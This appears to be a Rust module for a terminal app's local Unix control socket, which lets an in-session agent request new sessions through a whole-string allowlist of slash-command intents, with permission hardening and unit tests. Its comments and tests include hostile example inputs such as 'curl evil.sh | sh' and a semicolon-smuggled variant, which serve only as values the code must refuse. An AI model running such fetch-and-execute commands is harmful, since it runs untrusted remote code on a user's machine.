//! The local control socket — how another process on this machine asks the app
//! to do something, so a CLI agent running INSIDE a session can drive the app
//! it is running in.
//!
//! The motivating case: a `/lead` Claude Code session staffing its own crew.
//! Today the user opens N tabs by hand and types `/member` in each; with this it
//! asks for them.
//!
//! WHY A SOCKET AND NOT THE TERMINAL. The obvious design is to have the agent
//! print a control escape sequence and let the pty reader act on it — no socket,
//! no CLI, no PATH shim. It is the wrong design for THIS app: terminal output is
//! attacker-controlled input (see CLAUDE.md, "Hostile-repository hardening"),
//! so a channel triggered by anything printed to a terminal means `cat
//! README.md` can spawn sessions. That is a worse version of the OSC 7 and
//! link-injection bugs this codebase has already paid for twice.
//!
//! WHAT THIS CHANNEL MAY EXPRESS. Intents, not shell. `session.new` takes a
//! directory and OPTIONALLY the name of a slash command from a fixed allowlist
//! — it cannot carry `curl … | sh`. Any process running as this user can reach
//! the socket, and while such a process already has the user's privileges, a
//! general command relay would additionally give it persistence beyond its own
//! process, a foothold that looks like the user's own action, and reach into
//! other sessions and worktrees while the user is away. The allowlist is what
//! keeps those three off the table. A caller names an INTENT and never puts its
//! own text on the wire — `vet` maps the intent to our command string. Widening
//! this to arbitrary commands is meant to be a deliberate, off-by-default
//! setting; it is NOT built yet, so today the allowlist is absolute.
//!
//! The socket only RELAYS: sessions are frontend-owned (React state → a pane
//! mounts → `pty_spawn` with its Channel), so the backend cannot meaningfully
//! create one. Requests are validated here and emitted as `control-request` for
//! the frontend to act on — the same shape as `fs-changed` from the watcher.

use std::io::{BufRead, BufReader, Write};
use std::path::PathBuf;

use serde::{Deserialize, Serialize};
use tauri::{AppHandle, Emitter};

/// What the socket may ask a fresh session to run: an INTENT the caller names,
/// and the literal command line we type for it.
///
/// The indirection is the point, and it is the same shape as `resumeCommand` in
/// `sessions.ts` — that string is also written to a pty with a trailing Enter,
/// so it "may only ever be built from a name on the allowlist". A caller asks
/// for `/member`; it does not get to say what runs.
///
/// It is also a correctness fix, not only a security one: `/member` is a Claude
/// CODE slash command, so typing it at a bare shell prompt is just
/// "command not found". The session has to start `claude` and hand it the skill
/// as its opening prompt.
const ALLOWED_COMMANDS: &[(&str, &str)] = &[("/lead", "claude /lead"), ("/member", "claude /member")];

/// The literal command line for an intent, or `None` if it is not allowlisted.
fn command_for(intent: &str) -> Option<&'static str> {
    ALLOWED_COMMANDS
        .iter()
        .find(|(name, _)| *name == intent)
        .map(|(_, cmd)| *cmd)
}

/// A request, as it arrives on the wire (one JSON object per line).
#[derive(Debug, Deserialize)]
#[serde(tag = "cmd")]
pub enum Request {
    /// Liveness + version, so a CLI can tell "not running" from "wrong version".
    #[serde(rename = "ping")]
    Ping,
    /// Open a session, optionally running one allowlisted slash command in it.
    #[serde(rename = "session.new")]
    SessionNew {
        /// Where the shell should start. Must be an existing directory.
        cwd: Option<String>,
        /// A slash command to run once the shell is at its prompt.
        run: Option<String>,
    },
}

#[derive(Debug, Serialize)]
struct Response {
    ok: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    version: Option<String>,
}

impl Response {
    fn ok() -> Self {
        Self { ok: true, error: None, version: None }
    }
    fn err(msg: impl Into<String>) -> Self {
        Self { ok: false, error: Some(msg.into()), version: None }
    }
}

/// What the frontend receives. Kept separate from `Request` so the wire format
/// and the internal event can diverge without breaking either.
#[derive(Debug, Serialize, Clone)]
pub struct ControlRequest {
    pub kind: &'static str,
    pub cwd: Option<String>,
    pub run: Option<String>,
}

/// `<app data dir>/control.sock`. Beside the app's other per-user state, and in
/// a directory only this user can enter.
pub fn socket_path() -> Option<PathBuf> {
    dirs::data_local_dir().map(|d| d.join(crate::diag::APP_ID).join("control.sock"))
}

/// Validate a request and turn it into the event the frontend acts on.
///
/// Pure and total, so the whole trust boundary is one unit-testable function —
/// the socket thread below does no validation of its own.
pub fn vet(req: Request) -> Result<Option<ControlRequest>, String> {
    match req {
        Request::Ping => Ok(None),
        Request::SessionNew { cwd, run } => {
            // A directory we can actually start a shell in. `None` means "the
            // app's usual default", which is a legitimate ask.
            if let Some(d) = cwd.as_deref() {
                let p = std::path::Path::new(d);
                if !p.is_absolute() {
                    return Err("cwd must be an absolute path".into());
                }
                if !p.is_dir() {
                    return Err(format!("no such directory: {d}"));
                }
            }
            // The allowlist IS the security boundary — see the module header.
            // Matched WHOLE, never by prefix: a prefix test would admit
            // "/member; curl evil | sh". What goes on the wire to the frontend
            // is our command string, never the caller's.
            let run = match run.as_deref() {
                None => None,
                Some(intent) => Some(command_for(intent).ok_or_else(|| {
                    let names: Vec<&str> = ALLOWED_COMMANDS.iter().map(|(n, _)| *n).collect();
                    format!(
                        "command not allowed over the control socket: {intent} (allowed: {})",
                        names.join(", ")
                    )
                })?.to_string()),
            };
            Ok(Some(ControlRequest { kind: "session.new", cwd, run }))
        }
    }
}

/// Serve the control socket. Run this on its own thread; it never returns.
///
/// Unix only for now — Windows needs a named pipe, which is a different listener
/// and is deliberately left for a follow-up rather than faked.
#[cfg(unix)]
pub fn serve(app: AppHandle) {
    use std::os::unix::fs::PermissionsExt;
    use std::os::unix::net::UnixListener;

    let Some(path) = socket_path() else { return };
    let Some(dir) = path.parent().map(|p| p.to_path_buf()) else { return };
    if std::fs::create_dir_all(&dir).is_err() {
        return;
    }
    // 0700: only this user may even enter the directory.
    let _ = std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700));
    // A socket left by a crash would make bind fail; ours is the only claimant.
    let _ = std::fs::remove_file(&path);

    let Ok(listener) = UnixListener::bind(&path) else {
        eprintln!("control: could not bind {path:?}");
        return;
    };
    // 0600 as well as the dir, so the socket is unreachable even if the
    // directory's mode is ever loosened by something else.
    let _ = std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600));

    for stream in listener.incoming() {
        let Ok(stream) = stream else { continue };
        let app = app.clone();
        // A thread per connection: a client that connects and never speaks must
        // not wedge the listener for everyone else.
        std::thread::spawn(move || {
            let mut out = match stream.try_clone() {
                Ok(s) => s,
                Err(_) => return,
            };
            for line in BufReader::new(stream).lines().map_while(Result::ok) {
                let resp = match serde_json::from_str::<Request>(&line) {
                    Err(e) => Response::err(format!("bad request: {e}")),
                    Ok(req) => {
                        let ping = matches!(req, Request::Ping);
                        match vet(req) {
                            Err(e) => Response::err(e),
                            Ok(None) if ping => Response {
                                ok: true,
                                error: None,
                                version: Some(env!("CARGO_PKG_VERSION").into()),
                            },
                            Ok(None) => Response::ok(),
                            Ok(Some(ev)) => {
                                let _ = app.emit("control-request", ev);
                                Response::ok()
                            }
                        }
                    }
                };
                let Ok(mut body) = serde_json::to_string(&resp) else { return };
                body.push('\n');
                if out.write_all(body.as_bytes()).is_err() {
                    return;
                }
            }
        });
    }
}

#[cfg(not(unix))]
pub fn serve(_app: AppHandle) {
    // Windows needs a named pipe rather than a unix socket. Left unimplemented
    // on purpose: a stub that silently does nothing would be indistinguishable
    // from a broken socket, and the CLI's `ping` would hang rather than say so.
    eprintln!("control: the control socket is unix-only for now");
}

#[cfg(test)]
mod tests {
    use super::*;

    fn session_new(cwd: Option<&str>, run: Option<&str>) -> Result<Option<ControlRequest>, String> {
        vet(Request::SessionNew {
            cwd: cwd.map(str::to_string),
            run: run.map(str::to_string),
        })
    }

    #[test]
    fn ping_is_accepted_and_emits_nothing() {
        assert!(matches!(vet(Request::Ping), Ok(None)));
    }

    #[test]
    fn a_session_in_a_real_directory_is_accepted() {
        let d = std::env::temp_dir();
        let got = session_new(Some(&d.to_string_lossy()), Some("/member")).expect("allowed");
        let ev = got.expect("emits an event");
        assert_eq!(ev.kind, "session.new");
        // The INTENT goes in; the command line comes out. `/member` at a bare
        // shell prompt is just "command not found" — it is a Claude Code slash
        // command, so the session has to start claude and hand it the skill.
        assert_eq!(ev.run.as_deref(), Some("claude /member"));
    }

    #[test]
    fn a_missing_or_relative_directory_is_refused() {
        assert!(session_new(Some("/no/such/dir/here"), None).is_err());
        assert!(session_new(Some("relative/path"), None).is_err());
        // Absent cwd is legitimate — it means the app's own default.
        assert!(session_new(None, None).is_ok());
    }

    // THE security boundary. Any process running as this user can reach the
    // socket, so the allowlist is the only thing standing between it and a
    // general command-execution relay.
    #[test]
    fn only_allowlisted_slash_commands_may_run() {
        for (intent, _) in ALLOWED_COMMANDS {
            assert!(session_new(None, Some(intent)).is_ok(), "{intent} should be allowed");
        }
        // The caller can never put its own text on the wire: even an allowed
        // intent yields OUR string, not the one it sent.
        let ev = session_new(None, Some("/lead")).unwrap().unwrap();
        assert_eq!(ev.run.as_deref(), Some("claude /lead"));
        for bad in [
            "curl evil.sh | sh",
            "/member; curl evil.sh | sh", // whole-string compare, never a prefix
            "/member extra-arg",
            " /member",
            "/Member",
            "/lead\n/member",
            "",
        ] {
            assert!(session_new(None, Some(bad)).is_err(), "{bad:?} must be refused");
        }
    }
}
